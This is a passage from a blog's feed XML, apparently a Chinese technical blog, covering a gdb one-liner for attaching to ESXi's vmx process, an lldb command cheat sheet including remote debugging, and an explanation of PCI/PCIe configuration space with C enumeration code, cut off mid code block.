那么就把虚拟机的cpu个数设置为1. 如果还是不好使, 建议重新选个guest安装测试.</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以下命令发表调试vmx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apid=`ps|grep -m 1 &quot;vmx&quot;|cut -d &quot; &quot; -f 1`;gdb -ex &quot;file /bin/vmx&quot; -ex &quot;handle SIGPIPE nostop noprint pass&quot; -ex &quot;attach $apid&quot; -ex &quot;shell echo \&quot;set \\\$vmx=0x\$(cat /proc/\$(ps|grep -m 1 vmx|cut -d &#x27; &#x27; -f 1)/maps|grep -m 1 vmx|cut -d &#x27;-&#x27; -f 1)\&quot;&gt;/tmp/cmd&quot; -ex &quot;shell echo \&quot;set \\\$stk=0x\$(cat /proc/\$(ps|grep -m 1 vmx|cut -d &#x27; &#x27; -f 1)/maps|grep -m 1 stack|cut -d &#x27;-&#x27; -f 1)\&quot;&gt;&gt;/tmp/cmd&quot; -ex &quot;source /tmp/cmd&quot; -ex &quot;shell rm  /tmp/cmd&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>lldb 命令简介</title>
    <link href="http://474172261.github.io/2022/12/13/lldb-help/"/>
    <id>http://474172261.github.io/2022/12/13/lldb-help/</id>
    <published>2022-12-13T02:53:27.613Z</published>
    <updated>2022-12-13T02:54:04.631Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="查看模块基址"><a href="#查看模块基址" class="headerlink" title="查看模块基址"></a>查看模块基址</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(lldb) image list |grep prl_vm_app</span><br><span class="line">[  0] 08F2E3D7-D9F0-38E9-BA1F-0CA1E42095DE 0x000000010ca07000 /Applications/Parallels Desktop.app/Contents/MacOS/Parallels VM.app/Contents/MacOS/prl_vm_app</span><br></pre></td></tr></table></figure><h1 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">br set -a 0xXXXXXXXX 对地址下断点</span><br><span class="line">br set -f filename -l line</span><br><span class="line">br set -n viewDidLoad</span><br><span class="line">br set -n &quot;[类名 方法名]&quot;</span><br><span class="line">br list 列出断点</span><br><span class="line">br disa 禁用所有</span><br><span class="line">br en 3 启用断点3</span><br></pre></td></tr></table></figure><p>如果需要添加条件, 在最后添加<code>-c &quot;width &gt; 68&quot;</code>, 条件为width &gt; 68.</p><h2 id="断点命令"><a href="#断点命令" class="headerlink" title="断点命令"></a>断点命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(lldb) br com add 1</span><br><span class="line">Enter your debugger command(s).  Type &#x27;DONE&#x27; to end.</span><br><span class="line">&gt; p i</span><br><span class="line">&gt; bt</span><br><span class="line">&gt; DONE</span><br></pre></td></tr></table></figure><h1 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w s e -- 0x123456</span><br><span class="line">w s e -s 2 -- 0x123456</span><br><span class="line">w s e -w read/write -s 2 -- 0x123456</span><br></pre></td></tr></table></figure><h1 id="查看寄存器"><a href="#查看寄存器" class="headerlink" title="查看寄存器"></a>查看寄存器</h1><p><code>reg read</code>, <code>reg read rax</code></p><h1 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h1><p>显示指定地址的汇编</p><p><code>(lldb) dis -s $pc</code></p><p>也可以用<code>x/i</code></p><p>通过<code>(lldb) help arch</code>获取支持的架构, 然后<code>(lldb) dis -A arm -s $pc</code></p><h1 id="单步"><a href="#单步" class="headerlink" title="单步"></a>单步</h1><p>si, ni, fin等</p><h1 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h1><p><code>expr long $test = 12</code></p><p><code>p $test=123</code></p><h1 id="读取和修改内存"><a href="#读取和修改内存" class="headerlink" title="读取和修改内存"></a>读取和修改内存</h1><p><code>x/10gx addr</code>, ‘c, b, w, d, g’</p><p><code>memory write -s 2 &#39;bytes&#39; 1 2 3 4</code></p><h1 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h1><p>1.别名(alias),使用简单,但是这个只能用来实现没有输入的命令<br> 2.正则命令(command regex),可以通过正则表达式来捕获输入,并且将其应用到命令中.但是这个在执行多行命令的时候非常不方便,并且,这个只能有一个输入参数.<br> 3.桥接脚本(script bridging) 基于python,这个很好的权衡了方便和复杂性.并且可以做任何LLDB能做的事情.</p><p>针对第三种:</p><p>在命令行直接运行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script import sys</span><br><span class="line">script print (sys.version)</span><br></pre></td></tr></table></figure><p>在文件test.py中创建:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def findclass(debugger,command,result,internal_dict):</span><br><span class="line">    print(&quot;hello lldb&quot;)</span><br><span class="line">    # command 为输入</span><br><span class="line"></span><br><span class="line">def __lldb_init_module(debugger, internal_dict):</span><br><span class="line">    debugger.HandleCommand(&#x27;command script add -f findclass.findclass testcmd&#x27;)</span><br></pre></td></tr></table></figure><p>然后在lldb中引用<code>command script import ~/test.py</code></p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>参考<a href="https://lldb.llvm.org/use/remote.html">Remote Debugging</a></p><h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./lldb-server platform --listen <span class="string">&quot;*:1234&quot;</span> --server</span><br><span class="line"></span><br><span class="line">进入lldb client端</span><br><span class="line">(lldb) platform status <span class="comment"># 查看平台状态</span></span><br><span class="line">(lldb) platform list</span><br><span class="line">(lldb) platform select remote-freebsd</span><br><span class="line">  Platform: remote-freebsd</span><br><span class="line"> Connected: no</span><br><span class="line">(lldb) platform connect connect://192.168.1.8:1234</span><br><span class="line">  Platform: remote-freebsd</span><br><span class="line">    Triple: arm-unknown-linux-unknown</span><br><span class="line">OS Version: 5.10.93 (5.10.93)</span><br><span class="line">  Hostname: localhost</span><br><span class="line"> Connected: <span class="built_in">yes</span></span><br><span class="line">WorkingDir: /</span><br><span class="line">    Kernel: <span class="comment">#1 SMP Wed Dec 7 15:20:41 CST 2022</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><h2 id="更改workingdir"><a href="#更改workingdir" class="headerlink" title="更改workingdir"></a>更改workingdir</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) platform settings -w /usr/local/bin</span><br></pre></td></tr></table></figure><h2 id="将本地文件推送到目的机器运行"><a href="#将本地文件推送到目的机器运行" class="headerlink" title="将本地文件推送到目的机器运行"></a>将本地文件推送到目的机器运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(lldb) file a.out</span><br><span class="line">(lldb) run</span><br></pre></td></tr></table></figure><h2 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file  [target_binary] # 指定将要调试的二进制文件,注意是相对于WorkingDir的路径</span><br><span class="line">platform process list # 查看一直远端的进程, 找到目标进程pid, 或者名称</span><br><span class="line">attach 9053</span><br></pre></td></tr></table></figure><h2 id="将本地文件推到目的机器指定目录"><a href="#将本地文件推到目的机器指定目录" class="headerlink" title="将本地文件推到目的机器指定目录"></a>将本地文件推到目的机器指定目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(lldb) file a.out</span><br><span class="line">(lldb) script lldb.target.module[&#x27;a.out&#x27;].SetPlatformFileSpec(&quot;/bin/a.out&quot;)</span><br><span class="line"># 如果要包含模块</span><br><span class="line">(lldb) target module add /local/build/libfoo.so # 本地地址</span><br><span class="line">(lldb) script lldb.target.module[&#x27;libfoo.so&#x27;].SetPlatformFileSpec(&quot;/usr/lib/libfoo.so&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;查看模块基址&quot;&gt;&lt;a href=&quot;#查看模块基址&quot; class=&quot;headerlink&quot; title=&quot;查看模块基址&quot;&gt;&lt;/a&gt;查看模块基址&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PCI 配置空间介绍</title>
    <link href="http://474172261.github.io/2022/09/29/PCI/"/>
    <id>http://474172261.github.io/2022/09/29/PCI/</id>
    <published>2022-09-29T02:20:26.692Z</published>
    <updated>2022-09-29T09:23:55.429Z</updated>
    
    <content type="html"><![CDATA[<p>经常和虚拟化打交道, 一定会涉及到虚拟设备的初始化, 这就需要对硬件的初始化操作有一定的了解. 初始化硬件设备, 主要就是激活IO port 和IO memory的功能, 对于一些PCIe设备, 还可能需要激活一些capabilities. 本文的内容不是有条理的介绍, 更偏向于资料的整理. 希望可以帮助到大家.</p><span id="more"></span><h1 id="PCI"><a href="#PCI" class="headerlink" title="PCI"></a>PCI</h1><p>PCI配置空间和内存空间是分离的，那么如何访问这段空间呢？我们首先要对所有的PCI设备进行编码以避免冲突，通常我们是以三段编码来区分PCI设备，即Bus Number, Device Number和Function Number,以后我们简称他们为BDF(<a href="https://gist.github.com/cuteribs/0a4d85f745506c801d46bea22b554f7d">已知大部分VID表</a> )。为了保证其唯一性，Vendor ID应当向PCI特别兴趣小组(PCI SIG)申请而得到。</p><p>为了为PCI设备分配CPU-relative space，计算机系统需要知道其所申请的地址空间的类型、基址等，这些信息记录在设备的BAR中，每个PCI配置空间拥有6个BAR，因此每个PCI设备最多能映射6段地址空间(实际很多设备用不了这么多)。PCI配置空间的初始值是由厂商预设在设备中的，于是设备需要哪些地址空间都是其自己定的，可能造成不同的PCI设备所映射的地址空间冲突，因此在PCI设备枚举(也叫总线枚举，由BIOS或者OS在启动时完成)的过程中，会重新为其分配地址空间，然后写入PCI配置空间中。</p><p>通过memory space访问设备I&#x2F;O的方式称为memory mapped I&#x2F;O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I&#x2F;O。</p><p>通过I&#x2F;O space访问设备I&#x2F;O的方式称为port I&#x2F;O，或者port mapped I&#x2F;O，这种情况下CPU需要使用专门的I&#x2F;O指令如IN&#x2F;OUT访问I&#x2F;O端口。</p><p>常见的MMIO例子有，VGA card将framebuffer映射到memory space，NIC将自己的片上缓冲映射到memory  space，实际上，最典型的MMIO应该是DRAM，它将自己的存储空间映射到memory space，是占用CPU地址空间最多的“设备”。</p><p>一个典型的PCI架构如下:</p><p><img src="/images/PCI/v2-8019075041788ae2cc2810cb80be24aa_hd.jpg" alt="img"></p><h2 id="PCIe"><a href="#PCIe" class="headerlink" title="PCIe"></a>PCIe</h2><p>PCI是并行总线, 虽然表面上看, 并行总线会比串行总线一次性串数的数据更多, 但是随着频率的提高, 线路干扰越加严重, 而且并行传输对线路的一致性要求非常高, 设计更加麻烦, 而串行总线通过提高频率, 可以有效提高传输速度和传输质量, 因此PCIe采用了串行差分信号传输.</p><p><img src="/images/PCI/v2-710e375e3faea0c7103ebf4e3f82b957_hd.png" alt="img"></p><h2 id="Intel-pci-寄存器格式"><a href="#Intel-pci-寄存器格式" class="headerlink" title="Intel pci 寄存器格式"></a>Intel pci 寄存器格式</h2><p>有了BDF我们既可以唯一确定某一PCI设备。不同的芯片厂商访问配置空间的方法略有不同，我们以Intel的芯片组为例，其使用IO空间的CF8h&#x2F;CFCh地址来访问PCI设备的配置寄存器 (参考<a href="http://www.csit-sun.pub.ro/~cpop/Documentatie_SMP/Intel_Microprocessor_Systems/Intel_ProcessorNew/Intel%20White%20Paper/Accessing%20PCI%20Express%20Configuration%20Registers%20Using%20Intel%20Chipsets.pdf">Accessing PCI Express* Configuration Registers Using Intel® Chipsets</a>).</p><p><img src="/images/PCI/1565576320008.png" alt="1565576320008"></p><p>当我们需要获取&#x2F;修改特定设备值时:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write((<span class="number">1</span>&lt;&lt;<span class="number">31</span>)|(bus number&lt;&lt;<span class="number">16</span>)|(dev number&lt;&lt;<span class="number">11</span>)|(func number&lt;&lt;<span class="number">8</span>)|reg_number, <span class="number">0xcf8</span>)**;</span><br><span class="line">read(<span class="number">0xcfc</span>);<span class="comment">// or write(value, 0xcfc);</span></span><br></pre></td></tr></table></figure><p>关于如何配置PCI空间, 可以参考<a href="http://developer.amd.com/wordpress/media/2012/10/pci%20-%20pci%20express%20configuration%20space%20access.pdf">此链接</a>.</p><h2 id="PCI配置空间"><a href="#PCI配置空间" class="headerlink" title="PCI配置空间"></a>PCI配置空间</h2><p>PCI设备都有一个256字节的配置空间, 前0x40 bytes有固定的格式规范, header type 为 0 的结构如下:</p><p><img src="/images/PCI/1646295878003.png" alt="1646295878003"></p><p>其中<strong>Device ID</strong>和<strong>Vendor ID</strong>是区分不同设备的关键，OS和UEFI在很多时候就是通过匹配他们来找到不同的设备驱动（Class Code有时也起一定作用）。<a href="https://01.org/sites/default/files/documentation/ivb_ihd_os_vol3_part2_0.pdf">更多参考</a> 或者 <a href="http://fpga-faq.narod.ru/PCI_Rev_30.pdf">PCI Local Bus Specification 第六章</a>.</p><p>command 细节说明:</p><p><img src="/images/PCI/1565606247983.png" alt="1565606247983"></p><p><img src="/images/PCI/1565606329690.png" alt="1565606329690"></p><p><strong>与PCIE配置差异</strong></p><p><img src="/images/PCI/1566375425047.png" alt="1566375425047"></p><table><thead><tr><th>Type 0</th><th>Base Address Registers (0x10:0x24)</th><th>All Bits</th><th>PCIe Endpoint devices must set the BAR’s prefetchable bit while the  range does not contain memory with read side-effects or where the  memory does not tolerate write merging. 64-Bit Addressing MUST be  supported by non legacy Endpoint devices. The minimum memory address  range requested by a BAR 128-bytes.</th></tr></thead><tbody><tr><td>Type 0</td><td>Min_Gnt&#x2F;Max_Lat Registers (0x3E:0x3F)</td><td>All Bits</td><td>Does not apply to PCIe. Hardwired to 0.</td></tr></tbody></table><p><img src="/images/PCI/1566375381038.png" alt="1566375381038"></p><p><a href="https://wiki.osdev.org/PCI_Express#Enhanced_Configuration_Mechanism">Enhanced Configuration Mechanism</a></p><h2 id="PCIe配置空间"><a href="#PCIe配置空间" class="headerlink" title="PCIe配置空间"></a>PCIe配置空间</h2><p>PCIe规范为每个PCIe设备添加了更多的配置寄存器，空间为4K，尽管CFG_ADDR和CFG_DATA寄存器方法仍然能够访问lower 255 bytes，但是必须提供另外一种方法来访问剩下的（255B~4K）range寄存器。Intel的解决方案是使用了预留256MB内存地址空间，对这段内存的任何访问都会发起PCIe配置cycle。</p><p>由于4K的配置空间是directly mapped to memory的，那么PCIe规范必须保证所有的PCIe设备的配置空间占用不同的内存地址，按照PCIe规范，支持最多256个bus，每个Bus支持最多32个PCIe devices，每个device支持最多8个function,也就是说：占用内存的最大值为：256 * 32 * 8 * 4K &#x3D; 256MB。被PCIe配置空间占用的256M内存空间会屏蔽掉DRAM使用该段内存区，这些地址都由CPU出厂时已经固化好了。<a href="http://www.ssdfans.com/blog/2017/08/03/%E8%80%81%E7%94%B7%E5%AD%A9%E8%AF%BBpcie%E4%B9%8B%E5%85%AD%EF%BC%9A%E9%85%8D%E7%BD%AE%E5%92%8C%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/">老男孩读PCIe之六：配置和地址空间</a>,  <a href="https://www.ssdfans.com/blog/2018/10/25/%E4%BB%8Ecpu%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3pcie/">从cpu角度理解pcie</a>.</p><p><img src="/images/PCI/082916_1254_PCIe5.png" alt="img"></p><p>下图是ARM Cortex-A9 datasheet内存地址分配局部图:</p><p><img src="/images/PCI/3-1-1024x365.jpg" alt="img"></p><p>下图是Ubuntu Guest的cat &#x2F;proc&#x2F;iomem的截图:</p><p><img src="/images/PCI/1566289828132.png" alt="1566289828132"></p><p>图中的MMConfig(也叫 MMCFG) 就是PCIe的配置空间的映射地址. 因为只有0x80个bus, 所以size为 0x1000 * 8 * 32 * 128 &#x3D; 0x800,000. </p><blockquote><p>0000:00:0f.0 的意义是:segment number: bus number : device number: function number</p></blockquote><p>下图是windows的RWeverything工具读取的内容:</p><p><img src="/images/PCI/1566444712446.png" alt="1566444712446"></p><p>关于如何获取该地址, 参见后续ACPI章节.</p><blockquote><p>windows 获取ACPI的MCFG也可以通过FirmwareTablesView 工具读取MCFG表, 获取0x2C位置的地址, 即为segment0对应的baseAddr.</p></blockquote><p>访问PCIe设备配置空间时候需要手动计算访问PCIe配置空间的地址。计算发放如下:</p><p>SIZE_PER_FUNC &#x3D; 4K &#x3D; 1000h (fn&lt;&lt;12)</p><p>SIZE_PER_DEVICE &#x3D; 4K * 8 &#x3D; 8000h (dev&lt;&lt;15)</p><p>SIZE_PER_BUS &#x3D; 4K * 8 * 32 &#x3D; 100000h (bus&lt;&lt;20)</p><p>访问总线号为busNo，设备号为DevNo，功能号为funcNo的offset寄存器的计算公式是：</p><p>Memory Address &#x3D; BaseAddr+ busNo * SIZE_PER_BUS+ devNo * SIZE_PER_DEVICE+ funcNo * SIZE_PER_FUNC+ offset</p><p>PCIe在存储域地址空间分为三部分，PCIe控制器本身的寄存器、PCIe设备的配置空间、PCIe设备空间。寄存器和配置空间由处理器本身决定存储地址范围，ARM Cortex-A9 处理器地址范围如下图所示，配置空间地址、寄存器地址及内存地址都已经确定。PCIe设备空间需要编程人员去配置Outbound和Inbound寄存器组，确定映射关系。</p><p><img src="/images/PCI/1-1024x472.jpg" alt="img"></p><p><strong>Outbound</strong>在PCIe控制器中扮演的角色是将存储地址翻译到PCIe域的PCIe地址，Inbound是将PCIe地址翻译成存储地址，下图是一个完整的RC和EP模型地址翻译模型，图中的地址数字仅仅代表一种形态，具体地址应该是什么在后文中讲解。当cpu需要访问EP的内存空间时，首先应该将存储地址转换成PCIe地址，在根据TLP到达指定的EP，进而将PCIe地址转换成EP端的存储地址。<a href="https://www.ssdfans.com/blog/2018/11/01/%e4%bb%8ecpu%e8%a7%92%e5%ba%a6%e7%90%86%e8%a7%a3pcie%e7%bb%ad%e9%9b%86/">参考</a></p><p><img src="/images/PCI/2.jpg" alt="img"></p><h2 id="RC-Root-Complex"><a href="#RC-Root-Complex" class="headerlink" title="RC(Root Complex)"></a>RC(Root Complex)</h2><p>CPU只能直接访问Host内存（Memory）空间（或者IO空间，我们不考虑），不对PCIe等外设直接操作。RC可以为CPU分忧。</p><p>CPU如果想访问某个设备的空间，由于它不能（或者不屑）亲自跟那些PCIe外设打交道，因此叫太监RC去办。比如，如果CPU想读PCIe外设的数据，先叫RC通过TLP把数据从PCIe外设读到Host内存，然后CPU从Host内存读数据；如果CPU要往外设写数据，则先把数据在内存中准备好，然后叫RC通过TLP写入到PCIe设备。 以下是图形示例:</p><p><img src="/images/PCI/082916_1254_PCIe4.png" alt="img"></p><p>上图例子中，最左边虚线的表示CPU要读Endpoint A的数据，RC则通过TLP（经历Switch）数据交互获得数据，并把它写入到系统内存中，然后CPU从内存中读取数据（紫色箭头所示），从而CPU间接完成对PCIe设备数据的读取。 </p><p>具体实现就是上电的时候，系统把PCIe设备开放的空间（系统软件可见）映射到内存空间，CPU要访问该PCIe设备空间，只需访问对应的内存空间。RC检查该内存地址，如果发现该内存空间地址是某个PCIe设备空间的映射，就会触发其产生TLP，去访问对应的PCIe设备，读取或者写入PCIe设备。 </p><h2 id="BAR-base-address-register"><a href="#BAR-base-address-register" class="headerlink" title="BAR(base address register)"></a>BAR(base address register)</h2><p>Bar内存空间的细节:</p><p><img src="/images/PCI/1664417949426.png" alt="1664417949426"></p><p>计算bar空间大小方式如下:</p><ol><li>向bar 写入全1</li><li>读回寄存器里面的值，然后clear 上图中特殊编码的值，(IO 中bit0，bit1， memory中bit0-3)</li><li>取反+1, 得到空间大小.</li></ol><p><strong>映射地址空间</strong></p><p>使用I&#x2F;O内存首先要申请,然后才能映射,使用I&#x2F;O端口首先要申请,对I&#x2F;O端口的请求是让内核知道你要访问该端口,内核并让你独占该端口. 申请I&#x2F;O端口的函数是<strong>request_region</strong>, 申请I&#x2F;O内存的函数是<strong>request_mem_region</strong>。request_mem_region函数并没有做实际性的映射工作，只是告诉内核要使用一块内存地址，声明占有，也方便内核管理这些资源。重要的还是ioremap函数，ioremap主要是检查传入地址的合法性，建立页表（包括访问权限），完成物理地址到虚拟地址的转换。</p><p>可以通过<code>cat /proc/ioports</code> 和<code>cat /proc/iomem</code> 来查看系统已有的映射情况.</p><p><strong>workstation更换memory 地址</strong></p><ol><li>write 新地址到bar</li><li>重新激活command的第2个比特. 这样映射就会生效</li></ol><h2 id="PCI-to-PCI-bridge"><a href="#PCI-to-PCI-bridge" class="headerlink" title="PCI to PCI bridge"></a>PCI to PCI bridge</h2><p>它的配置空间如下:</p><p><img src="/images/PCI/v2-46ff2b447a3b736fd540fb27b7acf4a8_hd.jpg" alt="img"></p><p>其中的三组绿色的BUS Number和多组黄色的BASE&#x2F;Limit对，它决定了桥和桥下面的PCI设备子树相应&#x2F;被分配的Bus和各种资源大小和位置。这些值都是由PCI枚举程序来设置的。</p><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p>PCI-X和PCIe总线规范要求其设备必须支持Capabilities结构。在PCI总线的基本配置空间中，包含一个Capabilities Pointer寄存器，该寄存器存放Capabilities结构链表的头指针。在一个PCIe设备中，可能含有多个Capability结构，这些寄存器组成一个链表，其结构如图：</p><p><img src="/images/PCI/v2-6a9c100cb7a43758a47436a0115841cc_hd.jpg" alt="img"></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>HDAudio的配置空间说明如下:</p><p><img src="/images/PCI/1566371700027.png" alt="1566371700027"></p><p>以下是Workstation模拟的HDAudio的配置空间:</p><p><img src="/images/PCI/1566283096392.png" alt="1566283096392"></p><blockquote><p>似乎capability pointer指向的偏移处都是PCI power management功能的. XHCI就是这样.</p></blockquote><h2 id="VMware-workstation"><a href="#VMware-workstation" class="headerlink" title="VMware workstation"></a>VMware workstation</h2><p><img src="/images/PCI/1565689994200.png" alt="1565689994200"></p><h1 id="遍历PCI设备"><a href="#遍历PCI设备" class="headerlink" title="遍历PCI设备"></a>遍历PCI设备</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">retrieveAddress</span><span class="params">(u32 vid, u32 did, u32 *bar0, u32 *bar2)</span> &#123;</span><br><span class="line"></span><br><span class="line">u32 bus, dev, func;</span><br><span class="line">u32 dwAddr, dwData;</span><br><span class="line"><span class="comment">//u16 VID, DID, SVID, SDID;</span></span><br><span class="line"><span class="comment">//u32 addr = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (bus = <span class="number">0</span>; bus &lt;= <span class="number">255</span>; bus++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (dev = <span class="number">0</span>; dev &lt; <span class="number">32</span>; dev++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (func = <span class="number">0</span>; func &lt; <span class="number">8</span>; func++)</span><br><span class="line">&#123;</span><br><span class="line">dwAddr = <span class="number">0x80000000</span> + (bus &lt;&lt; <span class="number">16</span>) + (dev &lt;&lt; <span class="number">11</span>) + (func &lt;&lt; <span class="number">8</span>);</span><br><span class="line"><span class="comment">/* read vendor id */</span></span><br><span class="line">outl(dwAddr, PCI_CONFIG_ADDRESS);</span><br><span class="line">dwData = inl(PCI_CONFIG_DATA);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((((dwData &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) == did) &amp;&amp;<span class="comment">// vendor id</span></span><br><span class="line">((dwData &amp; <span class="number">0xffff</span>) == vid)) &#123;<span class="comment">// dev id</span></span><br><span class="line">outl(dwAddr | <span class="number">0x10</span>, PCI_CONFIG_ADDRESS);<span class="comment">// bar0</span></span><br><span class="line">*bar0 = inl(PCI_CONFIG_DATA);</span><br><span class="line"><span class="keyword">if</span> (*bar0 &amp; <span class="number">1</span>) &#123;</span><br><span class="line">*bar0 ^= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//outl(dwAddr | 0x18, PCI_CONFIG_ADDRESS);// bar2</span></span><br><span class="line"><span class="comment">//*bar2 = inl(PCI_CONFIG_DATA);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///*  read sub-vendor id*/</span></span><br><span class="line"><span class="comment">//outl(dwAddr | 0x10, PCI_CONFIG_ADDRESS);</span></span><br><span class="line"><span class="comment">//addr = inl(PCI_CONFIG_DATA);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//if (dwData != 0xffffffff)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//count++;</span></span><br><span class="line"><span class="comment">//VID = dwData &amp; 0xffff;</span></span><br><span class="line"><span class="comment">//DID = (dwData &gt;&gt; 16) &amp; 0xffff;</span></span><br><span class="line"><span class="comment">//SVID = dwData1 &amp; 0xffff;</span></span><br><span class="line"><span class="comment">//SDID = (dwData1 &gt;&gt; 16) &amp; 0xffff;</span></span><br><span class="line"><span class="comment">//printk(&quot;%02X\t%02X\t%02X\t%04X\t%04X\t%04X\t%04X\t\n&quot;,</span></span><br><span class="line"><span class="comment">//bus, dev, func, VID, DID, SVID, SDID);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Linux设备的初始化流程"><a href="#Linux设备的初始化流程" class="headerlink" title="Linux设备的初始化流程"></a>Linux设备的初始化流程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 